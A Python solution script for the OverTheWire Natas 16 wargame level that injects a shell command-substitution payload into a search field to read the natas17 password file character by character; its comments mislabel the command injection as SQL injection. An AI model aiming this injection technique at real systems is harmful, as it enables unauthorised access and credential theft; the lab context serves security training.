import string
import aiohttp
import asyncio
from halo import Halo


SPINNER_TEXT = "The password for natas 17 is: "

async def get_password_request(session, natas17_password, character):
    """
     If "African" is NOT the HTML body it means the SQLinjection was successful
     and therefore the length of the HTML body its different than the others.
    """
    payload = f"African$(grep ^{natas17_password + character} /etc/natas_webpass/natas17)"
    data = {"needle": payload}
    url = "http://natas16.natas.labs.overthewire.org/"
    async with session.post(url, data=data) as response:

        return response.content_length, character


async def get_password(session):
    spinner = Halo(text=SPINNER_TEXT, spinner="bouncingBar", color="blue")
    spinner.start()

    characters = string.ascii_letters + string.digits
    natas17_password = ""

    for _ in range(32):
        tasks = []

        for character in characters:
            tasks.append(asyncio.ensure_future(get_password_request(session, natas17_password, character)))

        requests = await asyncio.gather(*tasks)
        for response in requests:
            response_length = response[0]
            character_injected = response[1]
            if response_length != 512:
                natas17_password += character_injected
                spinner.stop()
                spinner = Halo(text=SPINNER_TEXT + natas17_password, spinner="bouncingBar", color="blue")
                spinner.start()

    spinner.succeed(text=SPINNER_TEXT + natas17_password)

    return natas17_password


async def make_session(natas16_password):
    """
    Create a session and start running an asynchronous function
    that exploits the SQLinjection.
    """
    auth = aiohttp.BasicAuth("natas16", natas16_password)
    async with aiohttp.ClientSession(auth=auth) as session:
        natas17_password = await get_password(session)

    return natas17_password


def get_natas17_password(natas16_password):
    """
    Create an event loop and run an asynchronous function.
    """
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    natas17_password = asyncio.run(make_session(natas16_password))

    return natas17_password


if __name__ == "__main__":
    natas16_password = ""  # Put here the password for natas16 here
    get_natas17_password(natas16_password)
